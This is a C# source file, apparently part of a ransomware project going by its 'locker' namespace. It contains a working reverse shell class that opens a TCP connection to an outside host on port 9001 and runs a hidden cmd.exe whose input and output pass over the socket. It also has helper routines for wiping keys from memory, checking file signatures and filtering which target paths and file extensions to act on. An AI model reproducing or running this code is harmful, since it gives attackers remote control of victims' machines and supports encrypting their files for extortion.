using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace s0s_L_ckr
{
    public sealed class Comn
    {
        private Comn()
        {
        }

        public class RevShell
        {
            static StreamWriter streamWriter;

            public static void StartShell()
            {
                using (TcpClient client = new TcpClient("8.8.8.8", 9001))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }

            private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();

                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception err) { }
                }
            }

        }
        public static readonly Random rand = new Random();

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void ClearArray(ref byte[] array)
        {
            //CLEAR ARRAY FROM MEM
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)rand.Next(0, 255);
            }
        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static unsafe void ClearString(ref string strg)
        {
            //CLEAR STRING FROM MEM
            if (strg == null)
                return;
            int strgLen = strg.Length;
            fixed (char* ptr = strg)
            {
                for (int i = 0; i < strgLen; i++)
                {
                    ptr[i] = (char)rand.Next(0, 255);
                }
             }
        }

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void OpenSecStr(ref String dest, ref SecureString srce)
        {
            //OPEN SECURE STRING METHOD
            IntPtr unmanStr = IntPtr.Zero;

            try
            {
                unmanStr = Marshal.SecureStringToGlobalAllocUnicode(srce);
                dest = Marshal.PtrToStringUni(unmanStr);
            }
            finally
            {
                Marshal.ZeroFreeGlobalAllocUnicode(unmanStr);
            }
        }

        public static Boolean CheckSig(FileInfo file)
        {
            //CHECK FILE SIG

            Boolean result = true;

            using (FileStream fileStm = File.OpenRead(file.FullName))
            {
                byte[] bData = new byte[ConfigMgr.FILE_SIGN_SIZE];
                fileStm.Read(bData, 0, bData.Length);

                for (int i = 0; i < ConfigMgr.FILE_SIGN_SIZE; i++)
                {
                    if (!(bData[i] == ConfigMgr.FILE_SIGN[i]))
                    {
                        result = false;
                        break;
                    }
                }
            }

            return result;

        }

        public static bool DireInFil(string fullNam)
        {
            //Override vector, TargetT PATH FILTER variable to null.
            if (ConfigMgr.TRGT_PTH_FLR == null)
                return true;
            String normPth = fullNam.ToUpper(CultureInfo.CurrentCulture);

            foreach (String targetPath in ConfigMgr.TRGT_PTH_FLR)
            {
                if (normPth.Contains(targetPath))
                    return true;
            }
            return false;
        }

        public static bool FileInFil(string fileExt)
        {
            bool resultValue = true;
            string normExt = fileExt.ToUpper(CultureInfo.CurrentCulture);
            foreach (string targetFile in ConfigMgr.TRGT_FILS)
            {
                if (normExt == targetFile)
                {
                    resultValue = true;
                }
                else
                { 
                    resultValue = false;
                }
            }
            return resultValue;
        }
    }
}
